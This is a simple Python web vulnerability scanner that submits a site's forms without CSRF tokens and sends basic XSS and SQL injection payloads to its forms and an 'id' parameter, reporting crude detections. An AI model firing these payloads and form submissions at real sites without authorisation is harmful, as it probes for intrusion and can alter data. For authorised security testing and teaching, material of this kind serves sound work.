import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys

xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>'
]

sqli_payloads = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR '1'='1' -- ",
    '" OR "1"="1" -- ',
    "' OR '1'='1' /*",
    '" OR "1"="1" /*',
    "' UNION SELECT NULL, NULL -- ",
    '" UNION SELECT NULL, NULL -- ',
]

class CSRFChecker:
    def __init__(self, target_url):
        self.target_url = target_url

    def find_forms(self):
        try:
            response = requests.get(self.target_url)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Error fetching the URL: {e}")
            return []

        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find_all('form')

    def check_csrf(self, form):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')


        full_action_url = urljoin(self.target_url, action)


        data = {input.get('name'): input.get('value') for input in inputs}
        csrf_protected = any('csrf' in input.get('name', '').lower() for input in inputs)


        if not csrf_protected:
            print(f"Submitting {method.upper()} request to {full_action_url} without CSRF token.")
            try:
                response = requests.request(method, full_action_url, data=data)
                if response.status_code == 200:
                    print(f"[!] Potential CSRF vulnerability detected at {full_action_url}")
                else:
                    print(f"[+] No CSRF vulnerability detected for {full_action_url}. Status code: {response.status_code}")
            except requests.RequestException as e:
                print(f"Error submitting the request to {full_action_url}: {e}")
        else:
            print(f"[+] Form at {full_action_url} is CSRF protected.")

    def run(self):
        forms = self.find_forms()
        if not forms:
            print("No forms found.")
            return
        for form in forms:
            self.check_csrf(form)

def check_xss(response):
    content = response.text
    for payload in xss_payloads:
        if payload in content:
            return True
    return False

def check_sqli(url):
    for payload in sqli_payloads:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url)
            response.raise_for_status()
            print(f"Testing URL: {test_url}")

            # Check for specific database error keywords
            if "sql" in response.text.lower() or "error" in response.text.lower():
                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            else:
                print(f"No obvious SQL Injection vulnerability detected with payload: {payload}")

        except requests.RequestException as e:
            print(f"Request failed: {e}")


def xss_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    for form in forms:
        action = urljoin(url, form.get('action', ''))
        method = form.get('method', 'get').lower()
        print(f"Testing form with action: {action}")

        for payload in xss_payloads:
            data = {input_tag.get('name'): payload for input_tag in form.find_all('input') if input_tag.get('name')}
            try:
                if method == 'post':
                    res = requests.post(action, data=data)
                elif method == 'get':
                    res = requests.get(action, params=data)
                else:
                    print(f"Unsupported form method: {method}")
                    continue

                if check_xss(res):
                    print(f"Potential XSS vulnerability detected in form at: {action}")
                else:
                    print(f"No XSS vulnerability detected in form at: {action}")

            except requests.RequestException as e:
                print(f"Error during form submission: {e}")

def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.RequestException as e:
        print(f"Error fetching URL {url}: {e}")
        return []

def main():
    if len(sys.argv) != 2:
        print("Usage: python scanner.py <URL>")
        sys.exit(1)

    target_url = sys.argv[1]
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    
    print(f"Starting security scan for: {target_url}")

    # CSRF Check
    csrf_checker = CSRFChecker(target_url)
    csrf_checker.run()

    # Check SQL Injection
    check_sqli(target_url)

    # Check XSS
    xss_scan(target_url)

if __name__ == "__main__":
    main()
